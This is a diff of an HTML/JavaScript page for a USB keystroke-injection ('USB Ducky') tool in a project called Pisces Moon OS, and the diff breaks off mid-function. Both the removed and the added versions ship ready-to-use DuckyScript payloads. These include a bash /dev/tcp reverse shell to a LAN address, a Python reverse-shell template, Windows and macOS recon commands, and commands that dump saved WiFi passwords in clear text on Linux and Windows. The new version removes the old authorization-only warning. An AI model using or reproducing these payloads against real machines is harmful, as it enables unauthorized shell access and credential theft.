@@ -1,381 +1,225 @@
 <!DOCTYPE html>
-<!-- 
-  Pisces Moon OS — usb_ducky.html
+<!--
+  Pisces Moon OS — usb_ducky.html v2
   Copyright (C) 2026 Eric Becker / Fluid Fortune
-  SPDX-License-Identifier: MIT
-  fluidfortune.com
-
-  Permission is hereby granted, free of charge, to any person obtaining
-  a copy of this software and associated documentation files, to deal in
-  the Software without restriction. See licenses/LICENSE-MIT.txt for full terms.
-
-  Dedicated to Jennifer Soto and Clark Beddows.
+  SPDX-License-Identifier: AGPL-3.0-or-later
 -->
-<!-- PISCES MOON OS // USB DUCKY -->
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<html lang="en"><head><meta charset="UTF-8">
+<link rel="stylesheet" href="pm_fonts.css">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>PISCES MOON // USB DUCKY</title>
+<link rel="stylesheet" href="pm_shared.css">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
-:root{--bg:#050a0e;--bg2:#080f14;--bg3:#0c1620;--panel-border:#1a3a50;--accent:#00d4ff;--accent2:#ff6b00;--accent3:#00ff88;--accent4:#ff3366;--warn:#ffcc00;--text:#7ab8d4;--text-bright:#c8e8f5;--text-dim:#2a5870;}
-*{margin:0;padding:0;box-sizing:border-box;}
-body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;min-height:100vh;display:flex;flex-direction:column;}
-body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.12) 2px,rgba(0,0,0,.12) 4px);pointer-events:none;z-index:999;}
-header{background:var(--bg2);border-bottom:2px solid rgba(255,51,102,.3);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
-.logo{font-family:'Orbitron',monospace;font-weight:900;font-size:1.1rem;color:var(--accent4);letter-spacing:3px;}
-.logo span{color:var(--accent2);}
-.auth-warn{background:rgba(255,51,102,.06);border-bottom:1px solid rgba(255,51,102,.2);padding:7px 24px;font-size:.6rem;color:rgba(255,51,102,.7);flex-shrink:0;}
-.main{display:grid;grid-template-columns:300px 1fr;flex:1;overflow:hidden;}
-.left{border-right:1px solid var(--panel-border);display:flex;flex-direction:column;overflow:hidden;}
-.right{display:flex;flex-direction:column;overflow:hidden;}
-.ph{padding:10px 16px;border-bottom:1px solid var(--panel-border);font-family:'Orbitron',monospace;font-size:.6rem;color:var(--accent4);letter-spacing:3px;display:flex;justify-content:space-between;align-items:center;background:var(--bg2);flex-shrink:0;}
-.ph .sub{color:var(--text-dim);font-size:.55rem;}
-.btn{padding:7px 16px;background:transparent;border:1px solid var(--accent4);color:var(--accent4);font-family:'Share Tech Mono',monospace;font-size:.68rem;cursor:pointer;letter-spacing:2px;transition:all .2s;}
-.btn:hover{background:var(--accent4);color:var(--bg);}
-.btn.cyan{border-color:var(--accent);color:var(--accent);}
-.btn.cyan:hover{background:var(--accent);color:var(--bg);}
-.btn.green{border-color:var(--accent3);color:var(--accent3);}
-.btn.green:hover{background:var(--accent3);color:var(--bg);}
-.btn.sm{padding:4px 10px;font-size:.6rem;}
-.btn:disabled{opacity:.3;cursor:not-allowed;}
-/* Backend panel */
-.backend-panel{padding:14px 16px;border-bottom:1px solid var(--panel-border);background:var(--bg2);flex-shrink:0;}
-.be-label{font-family:'Orbitron',monospace;font-size:.52rem;color:var(--text-dim);letter-spacing:2px;margin-bottom:8px;}
-.be-select{background:var(--bg3);border:1px solid var(--panel-border);color:var(--text-bright);font-family:'Share Tech Mono',monospace;font-size:.65rem;padding:6px 8px;width:100%;outline:none;cursor:pointer;margin-bottom:8px;}
-.be-select:focus{border-color:var(--accent4);}
-.be-info{font-size:.58rem;color:var(--text-dim);line-height:1.8;margin-bottom:8px;}
-.be-status{display:flex;align-items:center;gap:8px;font-size:.6rem;}
-.be-dot{width:8px;height:8px;border-radius:50%;}
-.be-dot.ok{background:var(--accent3);}
-.be-dot.err{background:var(--accent4);}
-.be-dot.check{background:var(--warn);animation:blink .5s step-end infinite;}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-/* Payload list */
-.payload-list{flex:1;overflow-y:auto;}
-.payload-row{padding:10px 14px;border-bottom:1px solid rgba(26,58,80,.3);cursor:pointer;transition:background .15s;display:grid;grid-template-columns:1fr auto;gap:6px;align-items:center;}
-.payload-row:hover{background:rgba(255,51,102,.04);}
-.payload-row.selected{background:rgba(255,51,102,.08);border-left:2px solid var(--accent4);}
-.payload-name{font-size:.68rem;color:var(--text-bright);}
-.payload-lines{font-size:.58rem;color:var(--text-dim);margin-top:2px;}
-/* Editor + exec */
-.editor-bar{padding:10px 16px;border-bottom:1px solid var(--panel-border);display:flex;gap:8px;align-items:center;background:var(--bg2);flex-shrink:0;flex-wrap:wrap;}
-.editor{flex:1;overflow:hidden;}
-textarea#payloadEditor{width:100%;height:100%;background:var(--bg3);color:var(--accent2);font-family:'Share Tech Mono',monospace;font-size:.72rem;padding:14px;border:none;outline:none;resize:none;line-height:1.8;caret-color:var(--warn);}
-.exec-panel{height:200px;border-top:1px solid var(--panel-border);display:flex;flex-direction:column;flex-shrink:0;}
-.exec-header{padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--panel-border);display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
-.exec-title{font-family:'Orbitron',monospace;font-size:.58rem;color:var(--accent4);letter-spacing:2px;}
-.progress-bar{height:4px;background:var(--bg3);flex-shrink:0;}
-.progress-fill{height:100%;background:var(--accent2);transition:width .2s;width:0%;}
-.exec-log{flex:1;overflow-y:auto;padding:8px 16px;font-size:.64rem;line-height:1.8;}
-.el-cmd{color:var(--accent2);}
-.el-ok{color:var(--accent3);}
-.el-err{color:var(--accent4);}
-.el-info{color:var(--text-dim);}
-.el-sys{color:var(--accent);}
-.pill{padding:3px 10px;border:1px solid;border-radius:2px;font-family:'Orbitron',monospace;font-size:.55rem;letter-spacing:2px;}
-.pill.ok{border-color:var(--accent3);color:var(--accent3);}
-.pill.err{border-color:var(--accent4);color:var(--accent4);}
-.pill.exec{border-color:var(--accent2);color:var(--accent2);animation:blink .4s step-end infinite;}
-.pill.idle{border-color:var(--text-dim);color:var(--text-dim);}
-::-webkit-scrollbar{width:4px;} ::-webkit-scrollbar-track{background:var(--bg3);} ::-webkit-scrollbar-thumb{background:var(--panel-border);}
-</style></head><body>
-<header>
-  <div class="logo"><span>USB</span> DUCKY</div>
-  <div style="display:flex;align-items:center;gap:12px">
-    <span style="font-size:.62rem;color:var(--text-dim)">Wired HID Injection // Pisces Moon OS</span>
-    <span class="pill idle" id="statusPill">IDLE</span>
-  </div>
+.dk-layout{display:grid;grid-template-columns:280px 1fr 260px;height:calc(100vh - 52px);overflow:hidden}
+.dk-left{border-right:1px solid var(--panel-border);overflow-y:auto}
+.dk-right{border-left:1px solid var(--panel-border);overflow-y:auto;padding:12px}
+.dk-center{display:flex;flex-direction:column;overflow:hidden}
+.payload-item{padding:10px 12px;border-bottom:1px solid rgba(28,46,58,.4);cursor:pointer;transition:background .15s}
+.payload-item:hover{background:rgba(accent3,0.04)}
+.payload-item.selected{background:rgba(0,0,0,.1);border-left:2px solid var(--accent3)}
+.payload-name{font-size:.72rem;color:var(--text-bright);margin-bottom:3px}
+.payload-meta{font-size:.58rem;color:var(--text-dim);display:flex;gap:8px}
+.payload-os{display:inline-block;padding:1px 5px;font-family:Orbitron,monospace;font-size:.45rem;border:1px solid var(--panel-border);color:var(--text-dim)}
+.editor{flex:1;display:flex;flex-direction:column;overflow:hidden}
+textarea.payload-editor{flex:1;background:var(--bg3);border:none;border-bottom:1px solid var(--panel-border);color:var(--accent3);font-family:Share\ Tech\ Mono,monospace;font-size:.72rem;padding:14px;resize:none;outline:none;line-height:1.8}
+.controls{padding:10px 12px;border-bottom:1px solid var(--panel-border);background:var(--bg2);display:flex;gap:8px;flex-wrap:wrap}
+.btn{padding:6px 14px;background:transparent;border:1px solid var(--accent3);color:var(--accent3);font-family:Share\ Tech\ Mono,monospace;font-size:.62rem;cursor:pointer;letter-spacing:2px;transition:all .15s}
+.btn:hover{background:var(--accent3);color:var(--bg)}
+.btn.danger{border-color:var(--accent4);color:var(--accent4)}
+.btn.danger:hover{background:var(--accent4);color:var(--bg)}
+.exec-log{padding:8px 12px;font-family:Share\ Tech\ Mono,monospace;font-size:.62rem;line-height:1.8;color:var(--accent3);overflow-y:auto;max-height:150px;border-top:1px solid var(--panel-border);background:var(--bg)}
+.timing-control{display:flex;align-items:center;gap:8px;font-size:.6rem;color:var(--text-dim)}
+input[type=range]{accent-color:var(--accent3)}
+</style>
+</head><body>
+<header class="pm-header">
+    <div class="pm-logo">🖥 <em>USB</em> DUCKY</div>
+    <div class="pm-hdr-right">
+        <div class="pm-live-badge" id="liveBadge" style="opacity:.3"><div class="pm-live-dot"></div>READY</div>
+        <span class="pm-last-update" id="lastUpdate"></span>
+    </div>
 </header>
-<div class="auth-warn">⚠ USE ONLY ON SYSTEMS YOU OWN OR HAVE EXPLICIT AUTHORIZATION TO TEST — USB/local HID keyboard injection</div>
-
-<div class="main">
-  <!-- Left -->
-  <div class="left">
-    <div class="backend-panel">
-      <div class="be-label">INJECTION BACKEND</div>
-      <select class="be-select" id="backendSelect" onchange="updateBackend()">
-        <option value="xdotool">xdotool (X11 — local)</option>
-        <option value="ydotool">ydotool (Wayland — local)</option>
-        <option value="hidg">hidg0 (USB HID device)</option>
-        <option value="simulate">Simulate (demo mode)</option>
-      </select>
-      <div class="be-info" id="beInfo">
-        Injects keystrokes via xdotool on the local X11 display.<br>
-        Install: <span style="color:var(--accent)">sudo apt install xdotool</span>
-      </div>
-      <div class="be-status">
-        <div class="be-dot check" id="beDot"></div>
-        <span id="beStatus">Checking backend...</span>
-      </div>
-      <div style="margin-top:8px">
-        <button class="btn sm cyan" onclick="checkBackend()">CHECK</button>
-      </div>
-    </div>
-    <div class="ph">PAYLOADS <span class="sub" id="payloadCount">0</span></div>
-    <div class="payload-list" id="payloadList"></div>
-    <div style="padding:10px 14px;border-top:1px solid var(--panel-border);display:flex;gap:6px">
-      <button class="btn sm cyan" onclick="newPayload()">+ NEW</button>
-      <button class="btn sm" onclick="document.getElementById('importInput').click()">IMPORT</button>
-      <input type="file" id="importInput" style="display:none" accept=".txt,.ds" onchange="handleImport(this.files)">
-    </div>
-  </div>
-
-  <!-- Right -->
-  <div class="right">
-    <div class="editor-bar">
-      <button class="btn" id="injectBtn" onclick="injectPayload()">▶ INJECT</button>
-      <button class="btn sm" id="abortBtn" onclick="abortExec()" disabled style="border-color:var(--accent4);color:var(--accent4)">■ ABORT</button>
-      <button class="btn sm" onclick="savePayload()" style="border-color:var(--accent3);color:var(--accent3)">SAVE</button>
-      <button class="btn sm" onclick="exportPayload()">EXPORT</button>
-      <span style="font-size:.6rem;color:var(--text-dim);margin-left:auto" id="editorStatus">Select or create a payload</span>
-    </div>
-    <div class="editor">
-      <textarea id="payloadEditor" placeholder="REM DuckyScript payload
-REM ─────────────────────────────────────────
-REM Pisces Moon USB Ducky — local HID injection
-REM Backend: xdotool (X11) / ydotool (Wayland) / hidg0 (USB)
-REM
-DELAY 1000
-GUI r
-DELAY 500
-STRING xterm
-ENTER
-DELAY 1000
-STRING echo 'Pisces Moon USB Ducky'
-ENTER" spellcheck="false"></textarea>
-    </div>
-    <div class="exec-panel">
-      <div class="exec-header">
-        <span class="exec-title">EXECUTION LOG</span>
-        <div style="display:flex;align-items:center;gap:10px">
-          <span style="font-size:.58rem;color:var(--text-dim)" id="execProgress">—</span>
-          <button class="btn sm" onclick="clearLog()">CLEAR</button>
+<div class="dk-layout">
+    <div class="dk-left">
+        <div class="pm-sh" style="position:sticky;top:0;z-index:10">PAYLOAD LIBRARY</div>
+        <div id="payloadList"></div>
+        <div style="padding:10px 12px;border-top:1px solid var(--panel-border)">
+            <button class="btn" style="width:100%" onclick="newPayload()">+ NEW PAYLOAD</button>
         </div>
-      </div>
-      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-      <div class="exec-log" id="execLog">
-        <span class="el-info">// PISCES MOON USB DUCKY</span><br>
-        <span class="el-info">// Linux backend: xdotool (X11), ydotool (Wayland), or /dev/hidg0 (USB HID)</span><br>
-        <span class="el-info">// Real execution: window.spadra.system.exec pipeline</span><br>
-        <span class="el-info">// Select backend above and press CHECK to verify availability.</span><br>
-      </div>
     </div>
-  </div>
+    <div class="dk-center">
+        <div class="controls">
+            <button class="btn" id="btnExec" onclick="executePayload()">▶ EXECUTE</button>
+            <button class="btn" onclick="stopExecution()">◼ STOP</button>
+            <button class="btn" onclick="savePayload()">💾 SAVE</button>
+            <button class="btn danger" onclick="deletePayload()">DELETE</button>
+            <div class="timing-control">
+                <span>DELAY:</span>
+                <input type="range" id="delaySlider" min="0" max="500" value="50" style="width:80px" oninput="updateDelay(this.value)">
+                <span id="delayVal">50ms</span>
+            </div>
+        </div>
+        <div class="editor">
+            <div style="padding:6px 14px;background:var(--bg2);border-bottom:1px solid var(--panel-border);display:flex;justify-content:space-between;align-items:center">
+                <span style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--text-dim)" id="payloadTitle">SELECT OR CREATE A PAYLOAD</span>
+                <span style="font-size:.58rem;color:var(--text-dim)" id="lineCount">0 lines</span>
+            </div>
+            <textarea class="payload-editor" id="payloadEditor" placeholder="# DuckyScript payload&#10;# Example:&#10;DELAY 500&#10;GUI r&#10;DELAY 500&#10;STRING cmd&#10;ENTER&#10;DELAY 500&#10;STRING whoami&#10;ENTER" oninput="onEditorChange()"></textarea>
+        </div>
+        <div class="exec-log" id="execLog">Ready. Select a payload and click EXECUTE.</div>
+    </div>
+    <div class="dk-right">
+        <div style="font-family:Orbitron,monospace;font-size:.55rem;letter-spacing:2px;color:var(--gold);margin-bottom:10px">TRANSPORT: USB</div>
+        <div style="font-size:.65rem;color:var(--text-dim);line-height:1.8;margin-bottom:14px">Injects keystrokes via USB HID. Target sees a keyboard.
+Plug T-Beam into target USB port.
+Requires USB HID firmware mode.</div>
+        <div style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--gold);margin-bottom:8px;margin-top:14px">TARGET OS DETECT</div>
+        <select id="targetOS" style="width:100%;background:var(--bg3);border:1px solid var(--panel-border);color:var(--text);font-family:Share\ Tech\ Mono,monospace;font-size:.62rem;padding:6px;margin-bottom:10px">
+            <option>Auto-detect</option>
+            <option>Windows</option>
+            <option>macOS</option>
+            <option>Linux</option>
+        </select>
+        <div style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--gold);margin-bottom:8px">EXECUTION STATUS</div>
+        <canvas id="exec-progress" width="236" height="80"></canvas>
+        <div id="execStatus" style="font-size:.62rem;color:var(--text-dim);margin-top:8px;line-height:1.8"></div>
+        <div style="font-family:Orbitron,monospace;font-size:.52rem;letter-spacing:2px;color:var(--gold);margin-top:14px;margin-bottom:8px">QUICK PAYLOADS</div>
+        
+        <div style="margin-top:6px">
+            <button class="btn" style="width:100%;margin-bottom:4px" onclick="loadQuick('recon_windows')">Recon Windows</button>
+            <button class="btn" style="width:100%;margin-bottom:4px" onclick="loadQuick('recon_mac')">Recon macOS</button>
+            <button class="btn" style="width:100%;margin-bottom:4px" onclick="loadQuick('reverse_shell')">Rev Shell Template</button>
+            <button class="btn" style="width:100%;" onclick="loadQuick('exfil_wifi')">WiFi Creds Dump</button>
+        </div>
+    </div>
 </div>
-
+<script src="pm_scraper.js"></script>
+<script src="pm_viz.js"></script>
+<script src="pm_transport.js"></script>
 <script>
-// ── State ────────────────────────────────────────────────────────────────
-let payloads = [];
-let selectedPayload = null;
-let executing = false;
-let abortFlag = false;
-let backendOK = false;
-
-const BACKENDS = {
-  xdotool: {
-    info: 'Injects keystrokes via xdotool on the local X11 display.\nInstall: <span style="color:var(--accent)">sudo apt install xdotool</span>',
-    check: 'which xdotool',
-    typeCmd: (text) => `xdotool type --clearmodifiers --delay 50 '${text}'`,
-    keyCmd: (key) => `xdotool key ${key}`,
-    envNote: 'X11 display required (DISPLAY=:0)'
-  },
-  ydotool: {
-    info: 'Injects keystrokes via ydotool (Wayland/evdev — no X11 needed).\nInstall: <span style="color:var(--accent)">sudo apt install ydotool</span>',
-    check: 'which ydotool',
-    typeCmd: (text) => `ydotool type '${text}'`,
-    keyCmd: (key) => `ydotool key ${key}`,
-    envNote: 'Requires ydotoold running: sudo ydotoold &'
-  },
-  hidg: {
-    info: 'Writes HID reports directly to /dev/hidg0 (USB Gadget mode).\nRequires kernel USB gadget module + configfs setup.',
-    check: 'ls /dev/hidg0',
-    typeCmd: (text) => `python3 /opt/pisces-moon/tools/hid_type.py '${text}'`,
-    keyCmd: (key) => `python3 /opt/pisces-moon/tools/hid_key.py '${key}'`,
-    envNote: 'USB Gadget: modprobe libcomposite + configfs'
-  },
-  simulate: {
-    info: 'Demo mode — simulates injection in this log window only.\nNo keystrokes are sent to any system.',
-    check: 'echo ok',
-    typeCmd: (text) => `[SIM] TYPE "${text}"`,
-    keyCmd: (key) => `[SIM] KEY ${key}`,
-    envNote: 'No real injection — for testing payloads'
-  }
+const TRANSPORT_CMD="CMD_USB_DUCKY";
+const QUICK_PAYLOADS={
+    recon_windows:`# Windows Recon\nDELAY 500\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING whoami && hostname && ipconfig && net user\nENTER`,
+    recon_mac:`# macOS Recon\nDELAY 500\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING whoami && hostname && ifconfig && id\nENTER`,
+    reverse_shell:`# Reverse Shell Template (edit IP/PORT)\n# Change TARGET_IP and PORT before use\nDELAY 500\nSTRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TARGET_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'\nENTER`,
+    exfil_wifi:`# Dump WiFi Credentials (Windows)\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd /k netsh wlan show profiles\nENTER\nDELAY 1000\nSTRING for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles') do @netsh wlan show profiles %i key=clear\nENTER`,
 };
 
-const BUILTIN = [
-  {name:'open_terminal.txt', content:`REM Open Terminal (X11/Linux)\nDELAY 500\nCTRL ALT t\nDELAY 1000\nSTRING echo "Pisces Moon was here"\nENTER`},
-  {name:'lock_workstation.txt', content:`REM Lock screen (GNOME/X11)\nDELAY 200\nCTRL ALT l`},
-  {name:'reverse_shell.txt', content:`REM Reverse shell one-liner (authorized testing only)\nDELAY 500\nCTRL ALT t\nDELAY 1200\nSTRING bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\nDELAY 200\nENTER`},
-  {name:'wifi_dump.txt', content:`REM Dump saved WiFi credentials (Linux NetworkManager)\nCTRL ALT t\nDELAY 1000\nSTRING sudo cat /etc/NetworkManager/system-connections/*.nmconnection\nENTER`},
+let payloads=PM.load("ducky_usb_payloads")||[
+    {id:"p1",name:"Hello World",os:"All",content:"DELAY 500\nSTRING Hello from Pisces Moon!\nENTER"},
+    {id:"p2",name:"Open Notepad (Win)",os:"Windows",content:"DELAY 500\nGUI r\nDELAY 500\nSTRING notepad\nENTER"},
 ];
+let selectedPID=null, executing=false, execDelay=50;
+let progressSpark;
 
-window.addEventListener('load', () => {
-  payloads = BUILTIN.map(p=>({...p}));
-  renderPayloadList();
-  selectPayload(0);
-  updateBackend();
-  setTimeout(checkBackend, 500);
-});
+const beam=new PMTransport({onMessage:handleData,onStatus:(s)=>{document.getElementById("liveBadge").style.opacity=s.state==="connected"?"1":"0.3";document.getElementById("lastUpdate").textContent=s.message;}});
 
-// ── Backend ───────────────────────────────────────────────────────────────
-function updateBackend() {
-  const be = document.getElementById('backendSelect').value;
-  const cfg = BACKENDS[be];
-  document.getElementById('beInfo').innerHTML = cfg.info + '<br><span style="color:var(--text-dim);font-size:.55rem">' + cfg.envNote + '</span>';
-  document.getElementById('beDot').className = 'be-dot check';
-  document.getElementById('beStatus').textContent = 'Not checked';
-  backendOK = false;
+function handleData(msg){if(msg.type==="DUCKY_STATUS")updateExecStatus(msg);}
+
+function initViz(){progressSpark=new PMViz.Sparkline("exec-progress",{color:"var(--accent3)",maxPts:30});}
+
+function renderPayloadList(){
+    document.getElementById("payloadList").innerHTML=payloads.map(p=>`
+        <div class="payload-item ${selectedPID===p.id?"selected":""}" onclick="selectPayload('${p.id}')">
+            <div class="payload-name">${PM.esc(p.name)}</div>
+            <div class="payload-meta">
+                <span class="payload-os">${PM.esc(p.os||"All")}</span>
+                <span>${p.content.split("\n").length} lines</span>
+            </div>
+        </div>`).join("");
 }
 
-function checkBackend() {
-  const be = document.getElementById('backendSelect').value;
-  document.getElementById('beDot').className = 'be-dot check';
-  document.getElementById('beStatus').textContent = 'Checking...';
-
-  if (be === 'simulate') {
-    backendOK = true;
-    document.getElementById('beDot').className = 'be-dot ok';
-    document.getElementById('beStatus').textContent = 'Demo mode ready';
-    execLog('// Backend: SIMULATE — demo mode active', 'el-sys');
-    return;
-  }
-
-  // Real check via spadra
-  if (window.spadra) {
-    window.spadra.system.exec(BACKENDS[be].check).then(r => {
-      backendOK = r.exitCode === 0;
-      document.getElementById('beDot').className = 'be-dot ' + (backendOK?'ok':'err');
-      document.getElementById('beStatus').textContent = backendOK ? 'Ready' : 'Not found — install required';
-      execLog(`// Backend ${be}: ${backendOK?'OK':'MISSING'}`, backendOK?'el-ok':'el-err');
-    });
-  } else {
-    // Demo: pretend simulate is always OK, others show warning
-    backendOK = false;
-    document.getElementById('beDot').className = 'be-dot err';
-    document.getElementById('beStatus').textContent = 'Trojan Horse bridge required for real exec';
-    execLog('// window.spadra not available — using simulate mode', 'el-info');
-    execLog('// Switch backend to "Simulate" for demo', 'el-info');
-  }
+function selectPayload(id){
+    selectedPID=id;
+    const p=payloads.find(x=>x.id===id); if(!p) return;
+    document.getElementById("payloadEditor").value=p.content;
+    document.getElementById("payloadTitle").textContent=p.name;
+    onEditorChange();
+    renderPayloadList();
 }
 
-// ── Payload list ──────────────────────────────────────────────────────────
-function renderPayloadList() {
-  document.getElementById('payloadCount').textContent = payloads.length;
-  document.getElementById('payloadList').innerHTML = payloads.map((p,i)=>`
-    <div class="payload-row ${selectedPayload===i?'selected':''}" onclick="selectPayload(${i})">
-      <div>
-        <div class="payload-name">${esc(p.name)}</div>
-        <div class="payload-lines">${p.content.split('\n').filter(l=>l.trim()).length} lines</div>
-      </div>
-    </div>`).join('');
+function onEditorChange(){
+    const lines=document.getElementById("payloadEditor").value.split("\n").length;
+    document.getElementById("lineCount").textContent=`${lines} lines`;
 }
 
-function selectPayload(i) {
-  selectedPayload = i;
-  document.getElementById('payloadEditor').value = payloads[i].content;
-  document.getElementById('editorStatus').textContent = payloads[i].name;
-  renderPayloadList();
-}
-function newPayload() {
-  payloads.push({name:`payload_${payloads.length+1}.txt`, content:`REM New Payload\nDELAY 500\n`});
-  renderPayloadList(); selectPayload(payloads.length-1);
-}
-function savePayload() {
-  if (selectedPayload===null) return;
-  payloads[selectedPayload].content = document.getElementById('payloadEditor').value;
-  execLog(`// Saved: ${payloads[selectedPayload].name}`, 'el-ok');
-}
-function exportPayload() {
-  if (selectedPayload===null) return;
-  const blob = new Blob([document.getElementById('payloadEditor').value],{type:'text/plain'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = payloads[selectedPayload].name;
-  a.click();
-}
-function handleImport(files) {
-  for (const f of files) {
-    const r = new FileReader();
-    r.onload = e => { payloads.push({name:f.name,content:e.target.result}); renderPayloadList(); selectPayload(payloads.length-1); };
-    r.readAsText(f);
-  }
+function executePayload(){
+    const content=document.getElementById("payloadEditor").value.trim();
+    if(!content){alert("No payload loaded");return;}
+    executing=true;
+    addLog("Executing payload...");
+    if(beam.connected) beam.send({type:TRANSPORT_CMD,src:"app",cmd_id:"dk1",payload:content,delay_ms:execDelay,target_os:document.getElementById("targetOS").value});
+    else simulateExecution(content);
 }
 
-// ── Injection engine ──────────────────────────────────────────────────────
-async function injectPayload() {
-  if (executing) return;
-  const be = document.getElementById('backendSelect').value;
-  const cfg = BACKENDS[be];
-  const content = document.getElementById('payloadEditor').value;
-  const lines = content.split('\n');
+function simulateExecution(content){
+    const lines=content.split("\n").filter(l=>l&&!l.startsWith("#"));
+    let i=0;
+    const interval=setInterval(()=>{
+        if(i>=lines.length||!executing){clearInterval(interval);addLog("Execution complete");return;}
+        addLog(`> ${lines[i]}`);
+        progressSpark.push(i/lines.length*100);
+        i++;
+    },execDelay+50);
+}
 
-  executing = true; abortFlag = false;
-  document.getElementById('injectBtn').disabled = true;
-  document.getElementById('abortBtn').disabled = false;
-  document.getElementById('statusPill').className = 'pill exec';
-  document.getElementById('statusPill').textContent = 'INJECTING';
-  execLog(`// Injecting via ${be}...`, 'el-sys');
+function stopExecution(){executing=false;addLog("Execution stopped");}
 
-  let defaultDelay = 0;
-  const cmdLines = lines.filter(l=>l.trim());
-
-  for (let i=0; i<cmdLines.length; i++) {
-    if (abortFlag) break;
-    const line = cmdLines[i].trim();
-    const pct = Math.round(i/cmdLines.length*100);
-    document.getElementById('progressFill').style.width = pct+'%';
-    document.getElementById('execProgress').textContent = `${i+1}/${cmdLines.length}`;
-
-    const [cmd,...args] = line.split(' ');
-    const arg = args.join(' ');
-
-    switch(cmd.toUpperCase()) {
-      case 'REM': execLog(`  REM ${arg}`, 'el-info'); break;
-      case 'DELAY': {
-        const ms = parseInt(arg)||500;
-        execLog(`  DELAY ${ms}ms`, 'el-info');
-        await sleep(Math.min(ms, 300));
-        break;
-      }
-      case 'STRING':
-        execLog(`  > ${cfg.typeCmd(arg)}`, 'el-cmd');
-        if (window.spadra && be!=='simulate') await window.spadra.system.exec(cfg.typeCmd(arg));
-        await sleep(40+arg.length*5);
-        break;
-      case 'STRINGLN':
-        execLog(`  > ${cfg.typeCmd(arg)} + ENTER`, 'el-cmd');
-        await sleep(40+arg.length*5);
-        break;
-      case 'ENTER': execLog(`  > ${cfg.keyCmd('Return')}`, 'el-cmd'); await sleep(20); break;
-      case 'GUI': execLog(`  > ${cfg.keyCmd(`super+${arg||''}`)}`, 'el-cmd'); await sleep(40); break;
-      case 'CTRL': execLog(`  > ${cfg.keyCmd(`ctrl+${arg||''}`)}`, 'el-cmd'); await sleep(30); break;
-      case 'ALT': execLog(`  > ${cfg.keyCmd(`alt+${arg||''}`)}`, 'el-cmd'); await sleep(30); break;
-      case 'SHIFT': execLog(`  > ${cfg.keyCmd(`shift+${arg||''}`)}`, 'el-cmd'); await sleep(20); break;
-      case 'TAB': execLog(`  > ${cfg.keyCmd('Tab')}`, 'el-cmd'); await sleep(15); break;
-      case 'ESCAPE': case 'ESC': execLog(`  > ${cfg.keyCmd('Escape')}`, 'el-cmd'); await sleep(15); break;
-      case 'DEFAULT_DELAY': case 'DEFAULTDELAY': defaultDelay=parseInt(arg)||0; execLog(`  DEFAULT_DELAY: ${defaultDelay}ms`,'el-info'); break;
-      default: execLog(`  ${line}`, 'el-cmd'); await sleep(20);
+function savePayload(){
+    const content=document.getElementById("payloadEditor").value;
+    if(!selectedPID){
+        const id="p"+Date.now();
+        payloads.push({id,name:"New Payload",os:"All",content});
+        selectedPID=id;
+    }else{
+        const p=payloads.find(x=>x.id===selectedPID); if(p) p.content=content;
     }
-    if (defaultDelay>0) await sleep(Math.min(defaultDelay,200));
-    await sleep(5);
-  }
-
-  document.getElementById('progressFill').style.width = abortFlag?'0%':'100%';
-  document.getElementById('execProgress').textContent = abortFlag?'Aborted':'Complete';
-  if (!abortFlag) execLog('// Injection complete.', 'el-ok');
-  else execLog('// ABORTED.', 'el-err');
-
-  executing = false;
-  document.getElementById('injectBtn').disabled = false;
-  document.getElementById('abortBtn').disabled = true;
-  document.getElementById('statusPill').className = 'pill idle';
-  document.getElementById('statusPill').textContent = 'IDLE';
-  setTimeout(()=>{document.getElementById('progressFill').style.width='0%';},2000);
+    PM.save("ducky_usb_payloads",payloads);
+    renderPayloadList();
+    addLog("Payload saved");
 }
 
-function abortExec() { abortFlag=true; }
-function execLog(msg,cls='el-info'){const l=document.getElementById('execLog');const s=document.createElement('span');s.className=cls;s.textContent=msg;l.appendChild(s);l.appendChild(document.createElement('br'));l.scrollTop=l.scrollHeight;}
-function clearLog(){document.getElementById('execLog').innerHTML='';}
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function deletePayload(){
+    if(!selectedPID)return;
+    if(!confirm("Delete this payload?"))return;
+    payloads=payloads.filter(p=>p.id!==selectedPID);
+    selectedPID=null;
+    PM.save("ducky_usb_payloads",payloads);
+    document.getElementById("payloadEditor").value="";
+    document.getElementById("payloadTitle").textContent="SELECT OR CREATE A PAYLOAD";
+    renderPayloadList();
+}
+
+function newPayload(){
+    const name=prompt("Payload name:"); if(!name) return;
+    const id="p"+Date.now();
+    payloads.push({id,name,os:"All",content:"# New payload\nDELAY 500\n"});
+    PM.save("ducky_usb_payloads",payloads);
+    selectPayload(id);
+    renderPayloadList();
+}
+
+function loadQuick(key){
+    document.getElementById("payloadEditor").value=QUICK_PAYLOADS[key]||"";
+    document.getElementById("payloadTitle").textContent=key.replace(/_/g," ").toUpperCase();
+    onEditorChange();
+}
+
+function updateDelay(v){execDelay=parseInt(v);document.getElementById("delayVal").textContent=v+"ms";}
+
+function updateExecStatus(msg){
